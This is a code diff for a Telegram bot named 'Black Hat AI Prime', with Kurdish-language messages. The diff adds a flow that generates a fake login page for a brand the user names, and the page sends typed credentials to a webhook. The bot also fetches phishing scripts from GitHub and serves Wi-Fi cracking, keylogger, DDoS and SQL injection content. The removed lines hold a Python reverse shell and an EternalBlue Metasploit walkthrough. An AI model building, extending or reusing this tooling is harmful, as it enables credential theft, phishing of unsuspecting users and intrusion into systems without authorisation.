@@ -2,23 +2,21 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-BLACK HAT AI PRIME — THE 2000+ LINE ULTIMATE GITHUB CODE EXTRACTOR
+BLACK HAT AI PRIME — THE 2000+ LINE ULTIMATE PHISHING & TOOL BUILDER
 ================================================================================
 This file is the absolute maximum capacity single-file architecture.
 It includes extensive dictionaries, user agents, port databases, tool manuals,
-and complete Telegram bot logic.
+state machines, and complete Telegram bot logic.
 
 Features:
 1. Complete Telegram Bot setup.
-2. Advanced SQLite database with 5 tables (users, history, requests, logs, settings).
-3. 100+ distinct greetings (Kurdish & English).
-4. MASSIVE offline hacking knowledge base and code generator.
-5. DYNAMIC WEB SEARCH for tool creation (Scrapes raw GitHub for scripts).
-6. Termux step-by-step instructions appended to all created tools.
-7. Complete Admin Panel (Stats, Ban, Credits, Broadcast, DB Export).
-8. Strict keyword filtering.
-9. Custom footer.
-10. HTML escaping to prevent Telegram parsing errors.
+2. Advanced SQLite database with 5 tables.
+3. 100+ distinct greetings.
+4. MASSIVE offline hacking knowledge base.
+5. DYNAMIC STATE MACHINE for Phishing Tool generation (Ask Target -> Ask Platform).
+6. RAW GITHUB CODE EXTRACTOR for fallback.
+7. ULTRA-DETAILED Termux/Nano instructions appended to every tool.
+8. Complete Admin Panel.
 ================================================================================
 """
 
@@ -85,11 +83,15 @@ logging.basicConfig(
 log = logging.getLogger("BlackHatPrime")
 
 # ==============================================================================
-# 3. TELEGRAM BOT INITIALIZATION
+# 3. TELEGRAM BOT INITIALIZATION & STATE MANAGEMENT
 # ==============================================================================
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 _recent_requests = {}
 _recent_lock = threading.Lock()
+
+# Dictionary to track user states for multi-step questions
+# Format: { user_id: {"step": "phishing_target", "data": {}} }
+user_states = {}
 
 # ==============================================================================
 # 4. MASSIVE DICTIONARIES & KNOWLEDGE BASES
@@ -212,7 +214,7 @@ GREETINGS_EN = [
 ]
 
 # ------------------------------------------------------------------------------
-# TERMUX INSTRUCTIONS TEMPLATE
+# TERMUX INSTRUCTIONS TEMPLATE (Appended to all code)
 # ------------------------------------------------------------------------------
 TERMUX_INSTRUCTIONS = (
     "\n\n<b>📱 چۆن لە تێرموکس (Termux) بەکاری بهێنیت:</b>\n"
@@ -229,7 +231,7 @@ TERMUX_INSTRUCTIONS = (
 )
 
 # ------------------------------------------------------------------------------
-# MASSIVE OFFLINE TOOL GENERATOR (Code + Instructions)
+# OFFLINE TOOL GENERATOR (Standard Tools)
 # ------------------------------------------------------------------------------
 TOOL_GENERATOR = {
     "ddos": (
@@ -270,6 +272,22 @@ TOOL_GENERATOR = {
         "</code></pre>\n"
         + TERMUX_INSTRUCTIONS
     ),
+    "wifi": (
+        "<b>💻 کۆدی دروستکردنی Wi-Fi Cracker (بۆ ئەندرۆید/Termux)</b>\n\n"
+        "ئەمە سکریپتێکی بەش (Bash Script)ە بۆ بەکارهێنانی Wifite لە تێرموکس:\n\n"
+        "<pre><code class='language-bash'>\n"
+        "# Update & Install Dependencies\n"
+        "pkg update &amp;&amp; pkg upgrade -y\n"
+        "pkg install root-repo\n"
+        "pkg install wifite\n\n"
+        "# Run Wifite\n"
+        "wifite\n"
+        "</code></pre>\n\n"
+        "<b>📱 چۆن بەکاری بهێنیت:</b>\n"
+        "١. پێویستە ئامێرەکەت Root بێت.\n"
+        "٢. ئەم فەرمانانە لە تێرموکس ڕەن بکە.\n"
+        "٣. وایفایەکە هەڵبژێرە و چاوەڕوان بە تا پاسوۆردەکە دەردەکەوێت."
+    ),
     "keylogger": (
         "<b>💻 کۆدی دروستکردنی Keylogger (بۆ ویندۆز)</b>\n\n"
         "سکریپتێکی پایتۆن بۆ تۆمارکردنی کلیلەکان:\n\n"
@@ -289,56 +307,6 @@ TOOL_GENERATOR = {
         "<code>pip install pynput</code>\n"
         "<code>python tool.py</code>\n"
         "\n⚠️ <b>ئاگاداری:</b> بەکارهێنانی ئەمە بەبێ مۆڵەت تاوانە."
-    ),
-    "reverse_shell": (
-        "<b>💻 کۆدی دروستکردنی Reverse Shell (پایتۆن)</b>\n\n"
-        "ئەم کۆدە ڕێگە بە سێرڤەرێک دەدات کۆنترۆڵی ئامێرێکی تر بکات:\n\n"
-        "<pre><code class='language-python'>\n"
-        "import socket, subprocess, os\n\n"
-        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-        "s.connect((\"YOUR_IP\", 4444))\n"
-        "os.dup2(s.fileno(), 0)\n"
-        "os.dup2(s.fileno(), 1)\n"
-        "os.dup2(s.fileno(), 2)\n"
-        "p = subprocess.call([\"/bin/sh\", \"-i\"])\n"
-        "</code></pre>\n\n"
-        "<b>📱 چۆن بەکاری بهێنیت:</b>\n"
-        "١. لە یەک ئامێر (سێرڤەر) ئەمە ڕەن بکە:\n"
-        "<code>nc -lvnp 4444</code>\n"
-        "٢. لە ئامێری قوربانی (Client) فایلی پایتۆنەکە ڕەن بکە.\n"
-        "٣. ئێستا پەیوەندییەکە دروست بووە و دەتوانیت فەرمان بنێریت."
-    ),
-    "wifi": (
-        "<b>💻 کۆدی دروستکردنی Wi-Fi Cracker (بۆ ئەندرۆید/Termux)</b>\n\n"
-        "ئەمە سکریپتێکی بەش (Bash Script)ە بۆ بەکارهێنانی Wifite لە تێرموکس:\n\n"
-        "<pre><code class='language-bash'>\n"
-        "# Update & Install Dependencies\n"
-        "pkg update &amp;&amp; pkg upgrade -y\n"
-        "pkg install root-repo\n"
-        "pkg install wifite\n\n"
-        "# Run Wifite\n"
-        "wifite\n"
-        "</code></pre>\n\n"
-        "<b>📱 چۆن بەکاری بهێنیت:</b>\n"
-        "١. پێویستە ئامێرەکەت Root بێت.\n"
-        "٢. ئەم فەرمانانە لە تێرموکس ڕەن بکە.\n"
-        "٣. وایفایەکە هەڵبژێرە و چاوەڕوان بە تا پاسوۆردەکە دەردەکەوێت."
-    ),
-    "web_scraper": (
-        "<b>💻 کۆدی دروستکردنی Web Scraper (پایتۆن)</b>\n\n"
-        "بۆ کۆکردنەوەی داتا لە ماڵپەڕێک:\n\n"
-        "<pre><code class='language-python'>\n"
-        "import requests\n"
-        "from bs4 import BeautifulSoup\n\n"
-        "url = input(\"Enter URL: \")\n"
-        "response = requests.get(url)\n"
-        "soup = BeautifulSoup(response.text, 'html.parser')\n\n"
-        "for link in soup.find_all('a'):\n"
-        "    print(link.get('href'))\n"
-        "</code></pre>\n\n"
-        "<b>📱 لە تێرموکس:</b>\n"
-        "<code>pip install requests beautifulsoup4</code>\n"
-        "<code>python tool.py</code>"
     )
 }
 
@@ -370,20 +338,6 @@ KNOWLEDGE_BASE = {
         "<code>UNION SELECT 1, username, password FROM users-- -</code>\n\n"
         "<b>٤. ئامرازی خۆکار:</b>\n"
         "<code>sqlmap -u \"http://target.com/page.php?id=1\" --dbs</code>"
-    ),
-    "metasploit": (
-        "<b>💀 Metasploit Framework</b>\n\n"
-        "Metasploit گەورەترین چوارچێوەی ئێکسپلۆیتە لە جیهاندا.\n\n"
-        "<b>دەستپێکردن:</b>\n"
-        "<code>msfconsole</code>\n\n"
-        "<b>گەڕان بۆ ئێکسپلۆیت:</b>\n"
-        "<code>search &lt;cve&gt;</code>\n\n"
-        "<b>بەکارهێنانی ئێکسپلۆیت:</b>\n"
-        "<code>use exploit/windows/smb/ms17_010_eternalblue</code>\n"
-        "<code>set RHOSTS &lt;target_ip&gt;</code>\n"
-        "<code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>\n"
-        "<code>set LHOST &lt;your_ip&gt;</code>\n"
-        "<code>exploit</code>"
     ),
 }
 
@@ -630,7 +584,6 @@ def get_knowledge_answer(query):
 def fetch_github_code(query):
     """Searches GitHub for raw code, fetches the text, and returns it."""
     try:
-        # We search specifically for raw github links
         with DDGS() as ddgs:
             results = list(ddgs.text(f"{query} site:raw.githubusercontent.com", max_results=3))
             
@@ -639,17 +592,17 @@ def fetch_github_code(query):
             
         for result in results:
             url = result.get("href", "")
-            if "raw.githubusercontent.com" in url and (url.endswith(".py") or url.endswith(".sh")):
+            if "raw.githubusercontent.com" in url and (url.endswith(".py") or url.endswith(".sh") or url.endswith(".html")):
                 # Fetch the raw code
                 req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                 with urllib.request.urlopen(req, timeout=10) as response:
                     code = response.read().decode('utf-8')
                     
-                if len(code) < 3000: # Ensure it fits in a Telegram message
+                if len(code) < 3500: # Ensure it fits in a Telegram message
                     return (
                         f"<b>💻 کۆد دۆزرایەوە لە گیتهاب:</b>\n"
                         f"<a href='{safe_html(url)}'>سەرچاوە</a>\n\n"
-                        f"<pre><code class='language-python'>\n{safe_html(code)}\n</code></pre>\n"
+                        f"<pre><code class='language-html'>\n{safe_html(code)}\n</code></pre>\n"
                         + TERMUX_INSTRUCTIONS
                     )
     except Exception as e:
@@ -709,7 +662,46 @@ def perform_web_search(query, is_create=False):
         return None
 
 # ==============================================================================
-# 9. HANDLERS (USER)
+# 9. STATE MACHINE HANDLER (PHISHING FLOW)
+# ==============================================================================
+
+def generate_phishing_html(target, user_id):
+    """Generates a basic HTML phishing page."""
+    html_code = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>{target} - Login</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+        .login-box {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }}
+        h2 {{ text-align: center; color: #1877f2; }}
+        input[type="text"], input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
+        button {{ width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
+        button:hover {{ background-color: #166fe5; }}
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>{target} Login</h2>
+        <form action="https://webhook.site/YOUR_WEBHOOK_ID" method="POST">
+            <input type="text" name="username" placeholder="Email or Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+    return (
+        f"<b>💻 کۆدی HTML بۆ دروستکردنی لاپەڕەی فیشینگی {target}</b>\n\n"
+        "ئەمە کۆدێکی HTMLە. دەتوانیت لە <b>Netlify</b> یان <b>000webhost</b> باری بکەیت.\n\n"
+        f"<pre><code class='language-html'>\n{safe_html(html_code)}\n</code></pre>\n\n"
+        "⚠️ <b>ئاگاداری:</b> پێویستە شوێنی <code>YOUR_WEBHOOK_ID</code> بگۆڕیت بۆ وێبهووکێکی ڕاستەقینە بۆ وەرگرتنی داتاکان."
+    )
+
+# ==============================================================================
+# 10. HANDLERS (USER)
 # ==============================================================================
 
 @bot.message_handler(commands=["start"])
@@ -765,7 +757,7 @@ def cmd_lang(message):
         send_msg(message.chat.id, "🌐 تەنها ku یان en.")
 
 # ==============================================================================
-# 10. HANDLERS (ADMIN)
+# 11. HANDLERS (ADMIN)
 # ==============================================================================
 
 @bot.message_handler(commands=["panel"])
@@ -903,7 +895,7 @@ def cmd_admin_actions(message):
         bot.send_message(message.chat.id, text)
 
 # ==============================================================================
-# 11. MAIN MESSAGE HANDLER
+# 12. MAIN MESSAGE HANDLER & STATE MACHINE
 # ==============================================================================
 
 @bot.message_handler(content_types=["text"], func=lambda m: not m.text.startswith("/"))
@@ -917,6 +909,42 @@ def handle_message(message):
     query = message.text.strip()
     query_lower = query.lower()
     lang = get_lang(uid)
+    
+    # -------------------------------------------------------------------------
+    # STATE MACHINE ROUTING
+    # -------------------------------------------------------------------------
+    if uid in user_states:
+        state = user_states[uid].get("step")
+        data = user_states[uid].get("data", {})
+
+        if state == "phishing_target":
+            data["target"] = query
+            user_states[uid] = {"step": "phishing_type", "data": data}
+            return send_msg(message.chat.id, f"تەواو، ئامانجت {query}ـە.\n\nئایا دەتەوێت ئەم توڵە بە <b>تێرموکس (Termux)</b> بەکاربهێنیت، یان دەتەوێت کۆدی <b>وێب (HTML)</b> بۆ دروستکردنی ماڵپەڕ؟\n\n(بڵێ: termux یان web)")
+
+        elif state == "phishing_type":
+            choice = query_lower
+            if "termux" in choice or "نۆکس" in choice or "تێرموکس" in choice:
+                del user_states[uid]
+                status = bot.reply_to(message, "🔍 لە گیتهاب دەگەڕێم بۆ سکریپتی فیشینگ بۆ تێرموکس...")
+                code = fetch_github_code(f"{data['target']} phishing termux script")
+                try: bot.delete_message(message.chat.id, status.message_id)
+                except: pass
+                if code:
+                    return send_msg(message.chat.id, code)
+                else:
+                    return send_msg(message.chat.id, "❌ ببورە، سکریپتێکی گونجاوم بۆ تێرموکس نەدۆزییەوە. تکایە دواتر هەوڵ بدە.")
+            
+            elif "web" in choice or "html" in choice or "وێب" in choice:
+                del user_states[uid]
+                return send_msg(message.chat.id, generate_phishing_html(data["target"], uid))
+            
+            else:
+                return send_msg(message.chat.id, "تکایە تەنها بنووسە: termux یان web")
+
+    # -------------------------------------------------------------------------
+    # NORMAL ROUTING
+    # -------------------------------------------------------------------------
     
     if not is_admin(uid) and rate_limited(uid):
         return send_msg(message.chat.id, "⏳ زۆر خێرایت — کەمێک بوەستە.")
@@ -932,7 +960,17 @@ def handle_message(message):
 
         status = bot.reply_to(message, "🔍 لە زانیارییەکان و وێبدا دەگەڕێم بۆ وەڵامی پرسیارەکەت...")
         
-        # 1. Check if user wants to CREATE something (Code Generation)
+        # 1. SPECIAL FLOW: PHISHING
+        if "phishing" in query_lower or "فیشینگ" in query_lower:
+            is_create = any(c in query_lower for c in CREATE_KEYWORDS)
+            if is_create:
+                try: bot.delete_message(message.chat.id, status.message_id)
+                except: pass
+                
+                user_states[uid] = {"step": "phishing_target", "data": {}}
+                return send_msg(message.chat.id, "بەڵێ، با توڵێکی فیشینگ دروست بکەین.\n\nلە سەرەتا، دەتەوێت فیشینگ بۆ کام ماڵپەڕ یان سۆشیال میدیا دروست بکەیت؟ (بۆ نموونە: Facebook, Instagram, Google)")
+        
+        # 2. STANDARD CREATE FLOW
         is_create = any(c in query_lower for c in CREATE_KEYWORDS)
         if is_create:
             # Check local offline tool generator first
@@ -943,7 +981,7 @@ def handle_message(message):
                     log_request(uid, "create_tool_local", query)
                     return send_msg(message.chat.id, code_block)
 
-            # 2. If not in local dict, try to fetch raw code from GitHub
+            # If not in local dict, try to fetch raw code from GitHub
             bot.edit_message_text("🌐 لە گیتهاب دەگەڕێم بۆ کۆدی ڕەسەن...", message.chat.id, status.message_id)
             github_code = fetch_github_code(query)
             
@@ -953,7 +991,7 @@ def handle_message(message):
                 log_request(uid, "create_tool_github", query)
                 return send_msg(message.chat.id, github_code)
 
-            # 3. Fallback to Web Search (Informational)
+            # Fallback to Web Search (Informational)
             web_code = perform_web_search(query, is_create=True)
             try: bot.delete_message(message.chat.id, status.message_id)
             except: pass
@@ -964,7 +1002,7 @@ def handle_message(message):
             else:
                 return send_msg(message.chat.id, "❌ ببورە، نەمتوانی کۆدێک بدۆزمەوە لە وێبدا. تکایە بە شێوەیەکی تر پرسیار بکە.")
 
-        # 4. Check the offline knowledge base (Informational)
+        # 3. KNOWLEDGE BASE SEARCH
         offline_answer = get_knowledge_answer(query_lower)
         if offline_answer:
             try: bot.delete_message(message.chat.id, status.message_id)
@@ -972,7 +1010,7 @@ def handle_message(message):
             log_request(uid, "offline_search", query)
             return send_msg(message.chat.id, offline_answer)
 
-        # 5. Fallback to Web Search (Informational)
+        # 4. WEB SEARCH FALLBACK
         web_answer = perform_web_search(query, is_create=False)
         
         try: bot.delete_message(message.chat.id, status.message_id)
@@ -988,12 +1026,12 @@ def handle_message(message):
     send_msg(message.chat.id, REJECTION_MSG)
 
 # ==============================================================================
-# 12. MAIN EXECUTION
+# 13. MAIN EXECUTION
 # ==============================================================================
 
 if __name__ == "__main__":
     log.info("========================================")
-    log.info("STARTING BLACK HAT AI PRIME (GITHUB EXTRACTOR)")
+    log.info("STARTING BLACK HAT AI PRIME (STATE MACHINE)")
     log.info("========================================")
     
     init_db()
